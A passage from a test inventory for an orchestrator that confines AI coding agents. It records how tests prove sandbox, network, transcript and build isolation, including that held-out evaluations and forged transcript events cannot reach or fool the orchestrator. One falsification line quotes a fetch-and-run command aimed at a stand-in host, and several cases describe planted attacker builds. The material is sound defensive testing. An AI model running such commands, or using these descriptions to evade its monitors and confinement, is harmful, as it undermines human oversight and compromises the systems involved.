  namespace not the orchestrator's), each asserted closed; an isolated
  command has a fixed `/tmp/<name>` of its own; and review round 21's M2
  turned round (tooling that reads host and port from `DATABASE_URL`
  reaches the database, as `localhost` and as the URL's host, in two
  concurrent commands on the one port).
- `tests/test_confined_inputs.py` (4 tests; formerly
  `tests/test_worker_tree_tmp.py`, whose worker-tree cases went with
  `_is_worker_tree`): an input outside the grant stops the run, the AST
  gate runs with leerie's temp files in the run directory, an AST script
  without the execution lock stops the run, and every caller holds it (a
  rule over the module).
- `tests/test_held_out_relays.py` (6 tests; DESIGN §8 *Nothing a held-out
  evaluation produces reaches a fixer but its verdict and leerie's own
  identifiers*): a synthetic held-back set whose declared names, file path
  and runner output carry a sentinel, driven through the real consumers —
  the residual names shown sets only; the next run's planner
  (`_prior_delivery_residual`) gets no held-back name; a residual recorded
  before the rule is re-derived at read time; the judge record gives a
  held-back set its verdict only; held-out transcripts never reach the
  record (through the real `claude_p` → `_invoke_admitted` → `_invoke`);
  leerie's runs of set files log on the held-out side. Each absence is
  paired with a shown set's names still arriving.
- `tests/test_worker_transcript_record.py` (13 tests; DESIGN §8 *What a
  worker ran is read from its own transcript, never from a command's
  output*): a measured command prints a forged `tool_use`/`tool_result`
  line, and each reader — the delivery record, the dependency-capture
  hint, the session a re-ask resumes, the malformed-envelope retry, run
  health — is shown not to read it, beside a real worker event it must
  read; a registry entry names a file of its own directory only; the
  CLI's stderr in a transcript is never an event; the conformer's axes are
  not measured into its transcript; `_run_streaming` refuses a worker's
  transcript as a command's log; a reader's named path is no transcript
  until registered; one reader (`_iter_transcript_events`) parses events
  out of line text, and a rule over the module catches a second
  transcript reader (with its own falsifier).
- `tests/test_commands_keep_default_signals.py` (4 tests; DESIGN §6 *A
  command leerie runs starts with the signal dispositions it would have
  outside leerie*; review round 20 L1): the reset list is every signal
  Python ignores at startup; a real `yes | head` started through the shim,
  through a measurement (`_run_streaming`) and through the spawn gate
  has the dispositions it has outside leerie (its own `SigIgn` read
  against the same probe run directly).
- `tests/test_landlock_isolation.py` (17 tests; DESIGN §6 *Every confined
  process has its own `/tmp`, `/dev/shm` and IPC*, *A held-out evaluation
  runs alone, in a world that dies with it (I3)*). The shim's `--sandbox`
  and `--isolate`, run for real; each channel the held-out isolation design
  measured open is attempted by the evaluated code and checked from the
  orchestrator's own namespace: `/dev/shm` and `/tmp` files, System V and
  POSIX IPC, the user and session keyrings, loopback TCP, an abstract
  socket and the internet, signals to outer processes, `utime`/`chmod`/
  `setxattr` outside the grants (EROFS), writes in the tree (overlay),
  leftover and SIGTERM-ignoring processes, a namespace or mount from the
  evaluated code; placement (overlay only, never over the tree's file),
  the report through its descriptor, the exit code and signal, a stop
  signal ending the namespace; `--isolate`'s private `/tmp` per command, a
  carried grant beneath `/tmp`, read-only metadata, the caller-owned root
  and IPC namespace; and review round 20's H1 proof turned around. Skipped
  where `isolation_error()` reports the host cannot build one (a developer
  host, CI): run in the container under the `leerie-container` profile
  with `--basetemp` outside `/tmp`. Live-falsified there, one mechanism at
  a time (no read-only remount, no private tmpfs, no IPC namespace, no
  seccomp, no overlay): each turned its own tests red. The keyring join is
  not separately observable: seccomp refuses `add_key` first.
- `tests/test_confined_network.py` (22 test functions, 34 cases; DESIGN
  §6 *A confined process has its own network; the outside is reached only
  through leerie's proxy*; review round 21 execution H2 and isolation
  R6). Anywhere: `_egress_refusal` over
  loopback, link-local, unspecified, multicast, IPv4-mapped and the
  container's own addresses; the real `_EgressProxy` on its unix socket
  refusing `CONNECT` and absolute-`http://` requests to loopback (by IP and
  by name), tunnelling to an allowed destination, rewriting a plain request
  to origin form without the hop-by-hop headers, answering 400 to anything
  else, and `forward` piping to the orchestrator's port; its 0700
  directory, a new one per proxy, so a second proxy in one process leaves
  the first one's socket serving (review r22 L1); `_confined_argv` naming the proxy only for an `egress` grant
  when isolated, and relaying the strict-output proxy's port; which kinds
  and workers carry `egress`; the shim's `--egress`/`--forward` parsing
  and `proxy_env`; `_require_egress_relay` naming each failure. In a
  runtime that can isolate: H2 turned round (a measurement's loopback
  server, which writes with its grant, unreachable from a worker directly
  and through the proxy); two concurrent commands binding one fixed port;
  a command without egress has `lo` only, no proxy variables, no route and
  no resolver; the relay tunnels, forwards, and ends with the command; the
  real probe of the confinement check every entry runs
  (`_require_confinement`) passes and fails closed on a shared network; and
  R6 turned round (a placement through a linked directory refused, the
  worker's tree untouched). Live-falsified in the container, one mechanism
  at a time: no network namespace, the proxy refusing nothing, placement
  following links before the read-only remount.
- `tests/test_install_reaches_inputs.py` (9 test functions; DESIGN §6 *An
  install reaches its inputs*; review round 22 execution H3). Anywhere:
  `INSTALL_KIND` is `MEASURE_KIND`'s grant with `egress` and nothing else
  (the run's stores written, as a measurement's are); the consumers executed — a
  recipe's `install` entries get egress and its `build` entry none
  (`_ensure_worktree_deps`), CI parity's recipe install and prerequisites
  get it and its check none (`_ci_prepare`, `_ci_run`), a `settle_by:
  install` re-install gets it and a coverage run none (`_install_settles`,
  `_cov_contained`); a rule over `leerie.py`: every function that reads a
  recipe's install entries or a check's prerequisites and spawns names
  `INSTALL_KIND`, and no other function
  names it, with the rule checked on a synthetic module. In a runtime
  that can isolate: a pip recipe in a committed view installs from PyPI
  through leerie's real egress proxy, while its `build` entry and a plain
  measurement of the same view, running the same download, reach nothing.
  Live-falsified on the host and in the container (rootless): the install
  entry back on `MEASURE_KIND`, the prerequisite without `INSTALL_KIND`,
  and every kind given egress, each turned its own tests red.
- `tests/test_user_scripts_on_path.py` (7 test functions; DESIGN §6
  *Which stores an install may share*, a moved user base's scripts on
  `PATH`): `_with_user_scripts` appending `<base>/bin` last in place of the
  replaced base's, never doubled, leaving a baked base and a `PATH`-less
  env alone; `_leerie_stores` leaving the orchestrator's `PATH` unchanged
  while `_worker_cache_env` and `_tree_stores_for` each end theirs in their
  own base's `bin`; a rule over the module: nothing sets the orchestrator's
  `PATH` (`test_nothing_sets_the_orchestrators_path`); a confined command
  outside every tree gets the stores' scripts on its own `PATH`
  (`_run_streaming`); under real
  Landlock, a measurement of a run tree running by name a script an
  install-kind command put in that tree's user base. In a runtime that can
  isolate: a real `pip install` defaulting to the user base, with no "not
  on PATH" warning, and its console script then run by a measurement.
  Live-falsified on the host and in the container: `_tree_store_env`
  without the call turned 2 host tests and 3 container tests red.
- `tests/test_worker_sees_tree_install.py` (4 test functions, 7 cases;
  DESIGN §6 *A worker started in a tree leerie installed for runs on that
  tree's stores*, review round 23 exec M1): for a tree in `_DEPS_INSTALLED`,
  the environment `_invoke` actually spawns the falsifier, acceptance
  writer, surrogate fixer and set auditor with names, for every
  `_TREE_STORE_VARS` variable, the value `_tree_stores_for` gives leerie's
  commands in that tree (never the worker cache's), every other store stays
  the side cache, `PATH` carries the tree's `pyuser/bin` and not the
  cache's; the grant names the tree's stores `rw` for the three committing
  workers and `ro` for the set auditor; a tree leerie never installed for
  (a subtask's) keeps the implementer on its cache. Under real Landlock, the
  falsifier's confined process runs by name a script an install-kind command
  put in the tree's user base. In a runtime that can isolate: a real
  `_ensure_worktree_deps` pip-installing pytest into the lane's user base,
  then the falsifier's confined process running `pytest --version` and
  `import pytest` from it. Live-falsified: `_invoke` without the overlay
  turned 5 host cases red and the container pip case red with `exec pytest:
  No such file or directory` (the review's symptom); `_installed_tree_stores`
  ignoring `_DEPS_INSTALLED` turned the subtask-tree case red. Green rootless
  and rootful in `leerie:r23` under the leerie-container profile.
- `tests/test_heldout_sandbox_preflight.py` (10 test functions, 22 cases):
  `_sandbox_fix` on the shim's measured failure lines (and the specific
  `setgroups` rule winning over the generic `EACCES` one), the gate's die
  messages and its per-property failures with the probe's subprocess
  faked, isolation switched on only by a passing gate, `_confined_argv`
  (no `--isolate` before the confinement check every entry runs; a
  held-out run always `--sandbox`),
  the entry (`_require_confinement`) running the gate right after
  `_require_landlock`, and the real
  gate where the runtime allows it.
- `tests/test_seccomp_filter.py` (5 test functions, 6 cases): the x86_64
  and aarch64 programs executed by a classic-BPF interpreter (every listed
  call EPERM, `clone3` ENOSYS, `clone` with each `CLONE_NEW*` flag EPERM,
  every other call below 460 allowed, a foreign architecture killed, x32
  refused), aarch64's numbers, the real filter on the host, Node's worker
  threads under it, and no table being a refusal.
- `tests/test_launcher_secopt.py` (13 tests; replaces
  `tests/test_rootless_seccomp.py`): the launcher's `SECOPT`/`APPARMOR_OPT`
  block executed with the runtime stubbed (seccomp unconfined on every
  runtime; the profile applied when loaded; a missing one stopping the
  launcher without a terminal or with `--no-runtime-install`), both
  expanded in the run argv, `scripts/runtime-install.sh`'s AppArmor
  helpers with the kernel stubbed, and the profile compiled
  (`apparmor_parser -Q`) with its mount rules and every allow rule of the
  released 0.43.0 profile.
- `tests/test_runtime_probes_pipefail.py` (11 test functions, 39 cases;
  DESIGN §6 *The launcher's detection gives the kernel's answer*, review
  r22 H1): the REAL `runtime_has_apparmor`/`runtime_apparmor_current` (and
  the launcher's `APPARMOR_OPT` block over them) under `set -euo pipefail`
  against a fixture securityfs (Ubuntu's LSM list with `apparmor` not last,
  300 profiles with `leerie-container` fourth), through the injectable
  `_RUNTIME_LSM_FILE`/`_RUNTIME_AA_PROFILES_DIR`/`LEERIE_APPARMOR_DEST`;
  and the rule — the pipefail files derived from the scripts' own `set`
  lines and `.` sourcing, none piping into an early-exit consumer (`grep
  -q/-m/-l`, `head`, `awk … exit`, `sed … q`, `cmp`, `read`), with the
  detector's positives and negatives pinned. Live-falsified: the old
  pipelines turn 15 cases red; one restored `| grep -Fxq` in
  `worktree-lib.sh` turns the rule red. The stubbed tests in
  `test_launcher_secopt.py` could not see it: a single `echo` gives the
  producer no second write to die on.
- `tests/test_ref_less_clone_git_is_leeries.py` (5 tests, DESIGN §6
  *Leerie's git never takes a tree's repository from the tree*): a ref-less
  clone is located at leerie's git directory (`<run>/clone-gits/<name>`);
  leerie's reads of the clone, in Python and in the shell, run nothing
  planted in the clone's own `.git`; a clone without leerie's git directory
  is refused, with no fallback to its own `.git`; removing the checkout
  removes leerie's git directory.
- `tests/test_run_layout.py` (9 tests; DESIGN §6 *A run directory is
  continued only by a leerie of its layout*, review round 21 L1): over a
  fixture shaped like a run directory main's code made (`branch` in
  `run.json`, no `run_layout` or `run_repo` in `state.json`, a transcript
  with no `transcripts.ndjson`), `resume` of an old layout and of a newer
  one is refused before anything writes in the directory, which is left
  untouched; `resume` of this layout is driven; a bare `resume` picks this
  layout's run over a later old one; `--phase` on an old layout is refused
  before its workers; a fresh run records `run_layout` and a resume never
  rewrites it; `leerie list` shows an old run with work left as
  `other-leerie`, and the overlay leaves orphans and finished runs alone.
  Replaces `tests/test_run_repo.py`'s pins of the old refusal, which keyed
  on `run_repo`-absent-and-`branch`-present and refused only after the run
  directory was loaded.
- `tests/test_phase_single_state.py` (3 tests): `--phase judge|heal`
  reaches its workers with one `State` per run per process. The real
  `main()`, with the real run-directory lock, is driven to each phase's
  first worker spawn (`claude_p`, stubbed), which must receive the `State`
  `main()` opened — the defect, on `main` since 60fca170, opened a second
  `State` whose flock the first refused, exiting 75 before any worker;
  heal with a failing verdict already indexed skips the judge and reaches
  its baseline worker; a `--phase` run-id naming no run is refused with no
  directory left behind.
- `tests/test_leerie_writes_never_follow_links.py` (17 tests; DESIGN §6
  *Leerie never writes through a path confined code shaped*, review round
  21 isolation R1, R2, R5): the primitives (`_write_beneath`,
  `_read_beneath`, `_mkdir_private`, `_remove_beneath`,
  `_add_dir_bits_beneath`) never follow a link at the destination or on
  the way, keep a replaced file's mode, and refuse a link or a FIFO to
  read; restoring a tree and placing a set write nothing through a link a
  command left or a commit carried; R1 — a held-out report is parsed from
  the sandbox's descriptor and never written back through a planted
  `reports/` link (behind the emulator, and in a real sandbox the set
  never reaches the worker's tree); R5 — a planted measurement-id link
  and a planted settings-restore temp link redirect nothing; R2 — each
  worker kind is granted its side's cache set only, and a held-out-side
  worker's `GOCACHE` is unreadable by a later implementer; a rule over the
  module classifies every function that uses a raw write primitive
  (primitives, leerie-only, confined), and the converted sites use none.
  The real-sandbox cases skip where the host cannot build a sandbox.
- `tests/test_cgroup_broker_descriptor.py` (7 tests; DESIGN §6 *No leerie
  service is reachable by a path from a process it does not serve*, review
  round 21 isolation R3): the real `scripts/cgroup-broker.py --spawn`
  chain, `serve()` loop and orchestrator client (`_adopt_cgroup_broker`,
  `_cgroup_request`, `_hand_cgroup_broker_to_exec`) over a throwaway
  v2-shaped directory: the orchestrator reaches the broker through its
  descriptor alone; the broker stops when the orchestrator is gone; an
  exec of the orchestrator (`_sleep_then_reexec`) keeps it; concurrent
  requests each get their own answer; a timed-out request leaves nothing
  for the next; no descriptor is an unreachable broker; and a descriptor
  that is not the broker's is not used.
- `tests/test_heldout_sandbox_reaches_no_broker.py` (2 tests,
  `real_heldout_sandbox`; same section): held-out code in a real sandbox
  cannot reach a real broker, and an isolated worker started through the
  shim holds no socket of the orchestrator's. Needs a real sandbox and a
  broker started by `cgroup-broker.py --spawn` with its v2 root at
  `$R21_CG_SLICE` (a container harness run as root, dropping to leerie as
  `container-entry.sh` does); skips otherwise.
- `tests/test_worker_commands_cannot_reach_the_cli.py` (12 test functions,
  13 cases; DESIGN §6 *A worker's commands cannot reach its CLI*, review
  round 21 isolation R4): with a stand-in CLI that runs
  `CLAUDE_CODE_SHELL_PREFIX` as the real one does (the shim, grants,
  `_invoke`, transcript registry and readers real), code a worker runs
  cannot write a forged event into its transcript through
  `/proc/<cli>/fd/1` (2 cases: unisolated and isolated, the latter skipped
  where the host cannot build a sandbox); a settings prefix below
  leerie's `--settings` cannot unset leerie's shell; settings layers merge
  in the CLI's order; no settings layer below leerie's widens a worker's
  tools — a lower layer gives only `permissions.deny`/`ask` and the
  keep-list below: the operator's `defaultMode`/`allow` and a checkout
  layer's are dropped, and
  so are `additionalDirectories`, an operator PreToolUse hook answering
  "allow", `enableAllProjectMcpServers`, `statusLine` and any other `env`
  name, while leerie's own hook stays (DESIGN §6 *The CLI reads no settings
  file*); a malformed settings file is logged and left out; a
  confined worker reads no settings file; the host seam reads only the
  operator's user settings (`--setting-sources user`) and gets no shell
  prefix; `scripts/worker-shell.py` fails closed (126) where it cannot nest, and
  runs a command as `bash` would. The keep-list (review rounds 31 and 32,
  execution 3 and X4) is the endpoint, the credentials and the model
  mapping: from the operator's untracked settings file every one of these
  CLI names reaches the worker — the four credential helpers
  `apiKeyHelper`, `awsCredentialExport`, `awsAuthRefresh`,
  `gcpAuthRefresh`; the API's, Bedrock's and Vertex's base URLs, switches
  and skip-auth switches; Foundry's switch, skip-auth switch, base URL,
  resource and key; the key and token; `ANTHROPIC_CUSTOM_HEADERS`;
  Vertex's project, region and a `VERTEX_REGION_CLAUDE_*` name;
  `ANTHROPIC_DEFAULT_{SONNET,OPUS,HAIKU,FABLE}_MODEL`,
  `ANTHROPIC_SMALL_FAST_MODEL` and its AWS region; `AWS_*` — while
  `otelHeadersHelper`, `NODE_OPTIONS`, a host path
  (`CLAUDE_CODE_CLIENT_CERT`, `ANTHROPIC_UNIX_SOCKET`) and
  `CLAUDE_CODE_OAUTH_TOKEN` do not, and a tracked settings file sets none
  of them. The first fails against the round-30 list, and against the
  round-31 list (no `ANTHROPIC_CUSTOM_HEADERS`, no Foundry name); the
  second passes there too (a guard: the tracked file was never read).

## The orchestrator's root is leerie's; a capture names packages and managers (review round 28, isolation E1, E2, A2)

- `tests/test_worker_root_view.py` — the shim's worker view. Unit: the
  worker stage's environment changes (`worker_env_changes`,
  `apply_worker_env`), a linked env file is not read, `_parse`'s
  `--worker-root`/`--cli` rules, an AST rule that `chroot` happens only in
  `enter_worker_view`, called only from `_before_exec` in the forked
  children of `run`/`run_as_init` after `_confine_or_126`, and that
  `worker-shell.py` nests before it enters the view; `_is_leeries_hook`.
  Isolation (container battery; skips where the host restricts user
  namespaces): a small worker root built from this root's `sh`, `bash`,
  `cat`, `env`, `grep` and their libraries, with a mark, an environment and
  an `/etc/ld.so.preload` trap. A confined command and a held-out runner run
  in it with no capability; a `--cli` process stays in leerie's root
  holding only `CAP_SYS_CHROOT`, its `worker-shell.py` commands run in the
  view, leerie's hook does not, and no trap complaint reaches the shim.
  Falsified: without the `import warnings` at the shim's top, `os.execvp`
  imported it in the child after it entered the view (two failures).
- `tests/test_repo_image_dockerfile.py` (18 functions, 79 cases, 2 of
  them opt-in) — the repository image's two builds (DESIGN §6 *One image,
  two roots*), from the launcher's own helpers, verbatim. `_repo_image_wrap` writes leerie's Dockerfile with no
  repository text, its final stage `FROM <base>` and one `COPY` to
  `/opt/leerie-worker-root/`; a linked Dockerfile is refused; an image that
  is not the base's layers plus one with the base's configuration is
  removed (7 cases). `build_repo_image`, with a builtins-only `nerdctl`,
  gives the first build the repository's bytes unchanged, no `--target`,
  the committed context and an OCI-layout destination, and the second only
  leerie's file with the layout as the `leerie-worker` named context, for
  each shape review rounds 32 and 33 found the rewrite diverging on (13
  cases: `$((1<<N))`, `<<<`, `${X//a/b}`, `${X:1:2}` and `${X:?m}` before a
  heredoc whose body holds a `FROM`, lower-case instructions under
  `# check=error=true`, a BOM before a directive and before a `FROM`,
  `` # escape=` ``, a `\x1c` before `<<EOF`, `# syntax=`, an open heredoc,
  an open continuation); `_repo_layout_digest` takes a layout holding
  exactly one image and nothing else. The build context and the image key
  (review round 30 isolation R1, DESIGN §6 *A repository image is the one
  built from what it reads*): the context is exactly what the instructions
  read (COPY/ADD sources, ONBUILD's, a RUN bind mount's, `.dockerignore`)
  and the extracted files are those; the key moves when a read file changes
  and not when another does; the local key and the Fly tag carry the
  context digest; each source form (`.`, `$VAR`, a wildcard before or in
  the last part, JSON form, `..`, an absent file, ONBUILD, a bind mount
  with and without a source, a cache mount) names its context; a
  whole-tree COPY keys on the whole tree. The lexing that makes the context
  (review round 31, execution 6): a tab after the instruction word or a
  flag, an empty, comment or whitespace-only line inside a continuation, a
  continuation joined with no separator, `# escape=`; a source through a
  committed link reads the link and what it names, a link leaving the tree
  adds nothing past itself. Heredocs (review rounds 32 and 33): a `<<` that
  BuildKit does not read as one — `$((1<<SHIFT))`, `<<<hello`, `'<<x'`,
  `"a <<x b"`, `a\<<x`, `x<<y`, a JSON-form `RUN`, a `\x1c` before `<<EOF`
  (Go's whitespace) — leaves the next `COPY` in the context (8 cases); a
  heredoc's delimiter is read as BuildKit reads it — `END-OF`, `'END OF'`,
  `"E.O.F"`, `E'O'F`, `<<-`, `0<<`, two on one line, and a line carrying
  `${X//a/b}`, `${X/a/b}`, `${X:1:2}`, `${X:?m}` or `${X##*/}` — so a
  `COPY` in its body names nothing (12 cases); the parser directives
  (round 32 X2, round 33 F3): `escape` sets the continuation, a comment, a
  blank line or an unknown key ends the directives, a BOM is dropped once,
  lower case is read (7 cases). Falsified live against mutations of the
  final tree, each restored: the repository's bytes written with a header
  line (13 of 13 bytes cases fail), a `--target` on the first build (14
  fail across this file and `test_build_repo_image.py`), Python's
  `isspace` in `shell_words` (the `\x1c` case), no BOM strip (2), the old
  `${...}` modifier refusals (4), a layout of more than one image accepted
  (1), a line added to leerie's file (1). Opt-in
  (`LEERIE_TEST_REPO_IMAGE=<base>`, real `nerdctl build`s through
  `build_repo_image`): a two-stage repository file, lower case under
  `# check=error=true` with a decoy `FROM` in a heredoc, passes
  `_check_repo_image`, and its worker root is the final stage (its file
  and environment, the first stage's file only as copied, nothing at the
  image's own root); E1's planted `.pth` is in the worker root and never
  runs in the image root's interpreter, as leerie or root, and the
  untracked `.env` is not in the image.
- `tests/test_buildkit_isolation.py` (49 functions, 100 cases, 22 of them
  opt-in: 12 real builds, one containerd of the test's own, and 9 under
  bash 3.2): no build consumes what
  another build left in BuildKit, every
  build is given leerie's frontend, and a repository image's build
  directory lives only as long as its launch, which no build outlives
  (DESIGN §6, *No build consumes what another build left in BuildKit*, *A
  repository's parser directives are its own build's; its frontend is
  leerie's*, *A repository image's build directory lives only as long as
  its launch*; review round 34, isolation R1, R2 and its observation, and
  execution R34E-1; review round 35, isolation I1, execution R35E-2 and
  claims R1; review round 36, isolation I2, execution X1 and X2; review
  round 37, isolation I3 and I4). From the launcher's own text:
  `_repo_image_prepare` dates every context entry (the root, a file, a
  committed link itself) at one time in the past year, never the commit's,
  and differently on each export, with the same key. Every build is given
  `--no-cache` and `--build-arg BUILDKIT_SYNTAX=` the one pinned frontend
  (`LEERIE_DOCKERFILE_FRONTEND`, `docker/dockerfile:1@sha256:<64 hex>`):
  the base build, both of `build_repo_image`'s, the three builds of a
  generated file whose language-dep layer fails (the layer's, then the
  apt-only file's two), and `build-push.sh` on the remote builder and on
  `--local-build` (2). The frontend is pulled into the namespace
  BuildKit's worker reads before the base build and before a repository
  build, and `ensure_frontend_in_worker_ns` pulls only when absent and
  warns on a failed pull (3). `build-push.sh` refuses a caller's `BUILDKIT_SYNTAX` on
  either builder (2). Derived from the build sites: each of the launcher's
  3 `nerdctl build` commands names the pin, and each of `build-push.sh`'s
  2 builds passes `build_arg_flags`, which both builders start with it.
  Every build is also given `--build-arg BUILDKIT_CACHE_MOUNT_NS=`: derived
  from the same sites, each launcher site names a variable drawn from
  `leerie_cache_mount_ns` with its failure handled, and both builders'
  `build_arg_flags` name it; run, the base build, both of
  `build_repo_image`'s, the generated file's three and each builder twice
  are given 10 namespaces, each `leerie-<32 hex>`, no two alike. With no
  random bytes, `leerie_cache_mount_ns` prints nothing and returns 1, and
  `build_repo_image` fails before any build. `build-push.sh` refuses
  `BUILDKIT_CACHE_MOUNT_NS` (`NAME=v`, `--build-arg=NAME=v`, bare, lower
  case) and a lower- or mixed-case `BUILDKIT_SYNTAX` on either builder
  (12). The build directory is `b.<launcher pid>.<random>`.
  `_sweep_stale_builds` removes a dead launcher's entry (a directory, a
  file, a link, whose target survives) and any entry untouched for a day,
  and keeps a live launcher's and a fresh one with no PID. The launcher's
  text after the base build runs the sweep. A real SIGTERM or SIGHUP to
  the launcher's shell while `build_repo_image`'s first build blocks (a
  builtins-only `nerdctl`) leaves no build directory, and the shell dies
  of the signal (2). A SIGTERM to the launcher's PID alone, then the
  blocked build released to export its layout: nothing writes the build
  directory again, and the build's process is gone. All three `$STAGE`
  EXIT traps, as written, remove a live build directory on a TERM.
  `_build_job` with the launcher's EXIT trap, on a pty (`setsid --ctty`)
  unless stated, under bash and, with `LEERIE_TEST_BASH32=<path>`, a bash
  3.2 (12): the terminal's ^C, a SIGTERM and a SIGHUP to the launcher's
  PID, and ^C with the output piped to `cat` under `tostop`, each kill the
  launcher by that signal (the piped one reports status 130), end the
  build's own child and leave no directory, which the released build does
  not write again; under `tostop`, and with no controlling terminal, the
  build's output arrives and its status 3 comes back.
  Opt-in (`LEERIE_TEST_BUILDKIT_ISOLATION=1`): a buildkitd the test starts
  in the rootless containerd's namespaces, with its own root, socket and
  containerd namespace, all removed afterwards, including the
  `<ns>_history` namespace BuildKit writes. On it: the two-branch
  reproduction through `build_repo_image` (main's worker root holds main's
  bytes); a cache mount repository A planted reads empty in repository B's
  build; leerie's base build, after another build ran its step through a
  proxy, holds no proxy; repository A, whose `# syntax=` names the official
  frontend behind a wrapper that drops `no-cache`, reads nothing of the
  private file repository V's build put in a cache mount; two repository
  builds through `build_repo_image` overlapping on it (attacker A's 40
  short cache-mount steps running inside victim V's 25 s step, which the
  steps' own clocks must show) share no mount either way: A's image holds
  nothing of V's committed file and V's step installs `clean`; and, after
  the fixture's daemon is pruned and the frontend's image removed,
  `ensure_frontend_in_worker_ns` and then a second buildkitd on the
  same namespace with an empty root and its registry behind a closed
  proxy port build with the pin (an image it does not hold fails there at
  the proxy). Round 34, falsified live (measured 2026-11-03): its 12
  default cases failed at its parent tree, and its 3 opt-in cases there
  too (main held `curl evil.invalid|sh #xyz`, B read `planted-by-A`, the
  base held the attacker's proxy); 14 mutations of its final tree each
  failed their cases. Round 35, falsified live (measured 2026-11-03):
  against the parent tree (plus `scripts/dockerfile-frontend.sh`, so the
  harnesses load), every case this round added or changed fails except
  the digest's form and the pull's own unit cases, which the mutations
  below cover; at the parent the opt-in I1 case's A read V's file, and
  with the pull removed the offline case failed to resolve the frontend at
  the closed proxy. Against the final tree, each of 13 mutations failed the
  cases it targets, each restored: the pin dropped from the first build,
  the wrap, the base, the remote builder or `--local-build`; the caller
  refusal removed; the pull dropped before the base build, at the build
  decision, or from `ensure_frontend_in_buildkit_ns`; `_build_job_end`
  dropped from `_repo_build_done`; the build run in the foreground; the
  local run's trap without `_repo_build_done`; and the fallback recorded
  under its own file's key (in `test_build_repo_image.py`). Round 36,
  falsified live (measured 2026-11-03), each mutation restored: the
  namespace dropped from the base build, the wrap, the remote builder or
  `--local-build`; one value reused for both of `build_repo_image`'s
  builds; the guard on its first draw removed; the helper's length check
  removed; the namespace dropped from `build-push.sh`'s refusal, and
  `nocasematch` dropped from it; each fails the cases it targets.
  `trap '' TTOU TTIN` dropped from the job fails `tostop` under both
  shells, and the INT trap dropped fails bash 3.2's `ctrl-c` (exit 129) and
  `piped-ctrl-c` (status 129). The opt-in overlapping-builds case, run
  with the namespace dropped from `build_repo_image`'s first build: the
  steps overlapped and A's image held V's committed file. All 6 opt-in
  real cases passed on that tree (BuildKit 0.31.2, rootless nerdctl 2.3.5).
  Round 37 (DESIGN §6 *No build consumes what another build left in
  BuildKit*, *The image store*; *A repository's build carries no operator
  credential*). Every harness that runs a repository build defines a
  builtins-only `buildctl` (`tests/conftest.py`'s `BUILDCTL_STUB`: one
  containerd worker reading `$STUB_WORKER_NS`, default `default`), so no
  test asks the host's daemon. Derived from the scripts: every nerdctl
  command in the launcher and `scripts/dockerfile-frontend.sh` starts with
  `--namespace`, naming `LEERIE_IMAGE_NS` (16 commands: build, image, kill,
  run, save) or one of six other spellings, each for its stated reason;
  the run's two quoted forms and prune's probe name it; `build-push.sh`'s
  4 nerdctl commands carry `ns_flags`. Run: the real launcher end to end
  against a stub `nerdctl` inspects and runs in `leerie`; `build_repo_image`
  refuses with no build when the worker reads `leerie` or `buildctl` does
  not answer, and builds both on `--buildkit-host` otherwise (4);
  `leerie_buildkit_resolve` asks in nerdctl's order and takes the first
  daemon that answers, `$BUILDKIT_HOST` alone when set, and fails on a
  first daemon with no containerd worker or a label that is no namespace
  name, or none answering (6); `leerie_sweep_worker_images` removes every
  `leerie-repo/…` and `docker.io/leerie-repo/…` name and nothing else,
  never with `-f`, refuses naming one left in use, and refuses when the
  listing fails (3), and the launcher's build decision calls it before any
  build (2, in `test_build_repo_image.py`); `_container_ns` finds a run's
  container in `leerie`, then `default`; both builds see
  `DOCKER_CONFIG=<build dir>/registry-auth`, mode 700, empty, with the
  operator's config in the environment. Opt-in, on the fixture's daemon,
  whose worker reads the test's namespace while a second namespace of the
  test's stands for `leerie`: a victim repository built by
  `build_repo_image` under leerie's name for it, and an attacking
  Dockerfile that names it by `FROM` and by `RUN --mount=type=bind,from=`
  fails both ways with "pull access denied", while the victim's own
  `FROM $BASE_IMAGE` built; the control, leerie's images in the worker's
  namespace and the check overridden, copies the victim's file; with
  leerie's namespace set to the worker's, `build_repo_image` refuses and
  runs no build; the sweep on the real namespace removes an unused
  `leerie-repo/…` name, keeps one a container was created from by digest
  and refuses naming it, and passes once the container is gone; and a
  registry on loopback inside RootlessKit's network namespace, holding a
  private image behind Basic authentication the operator's Docker config
  holds: the attack through `build_repo_image` fails with 401, while the
  same Dockerfile built directly with the operator's config reads the
  file. Falsified live (measured 2026-11-03), each mutation restored, each
  failing the cases it targets: `--namespace "$LEERIE_IMAGE_NS"` dropped
  from the wrap build, `_check_repo_image`'s inspect or the run; the
  equality check removed from `leerie_buildkit_check`, or the check from
  `build_repo_image`; `leerie_buildkit_resolve` skipping a daemon with no
  containerd worker; the sweep's second listing dropped, its `rm` forced,
  or its call dropped from the build decision; `default` dropped from
  `_container_ns`; `DOCKER_CONFIG` dropped from the first build, or the
  directory made 0755; the base copy keyed on presence, not id;
  `build-push.sh`'s `ns_flags` emptied. The opt-in registry case, with
  `DOCKER_CONFIG` dropped from the first build, read the file. Round 37's
  execution review (E1-E4): `_build_job` under bash and bash 3.2, on a pty
  (`setsid --ctty`), given two SIGHUPs or two SIGINTs 0.5 ms apart
  (busy-waited: sent back to back the kernel merges them), eight times
  each: the launcher dies of the signal, the build's child is gone and so
  is the directory (4); ^Z at an interactive `bash -i` whose job the
  launcher is (a session leader's own group is orphaned and the kernel
  drops ^Z's stop for it): the launcher and the build's group stop, nothing
  reaches the terminal after the prompt, and `fg` continues both to the
  build's status (2); `build-push.sh` with an `od` that fails leaves
  nothing in `$TMPDIR` on either builder (2); the base build, both of
  `build_repo_image`'s and `--local-build`'s are each followed by a
  `buildctl prune` of exactly their own namespace's cache-mount records,
  on the daemon they ran on; opt-in, a repository build that fills a
  20 MB cache mount leaves the daemon no more cache-mount records than
  before. Falsified live (measured 2026-11-03), each restored: the HUP
  handler as `trap - HUP; kill -HUP $$`, or none, and the INT handler as
  `trap - INT; kill -INT $$` (bash 5 left the directory; bash 3.2 too for
  INT); no TSTP trap, and no second wait after a trapped signal (^Z, both
  shells); the draw after the `mktemp` (the remote builder's file left);
  the prune dropped from the wrap build; opt-in, the prune dropped from
  the first build (one record more). The two-signal test was corrected
  before it discriminated: sent back to back, the two merged into one and
  passed against both mutations. All 11 opt-in real cases pass on this
  tree (BuildKit 0.31.2, rootless nerdctl 2.3.5).
  Round 38 (review round 38, isolation X1-X3, claims F3, execution X1
  and X2; DESIGN §6 *A repository's build carries no operator
  credential*, *The content store*, *The images an earlier leerie left*).
  Both builds see `DOCKER_CONFIG=<build dir>/registry-auth`, mode 700,
  holding only `config.json` = `{"auths":{"leerie.invalid":{}}}`, and
  `DOCKER_AUTH_CONFIG` empty, with the operator's config and
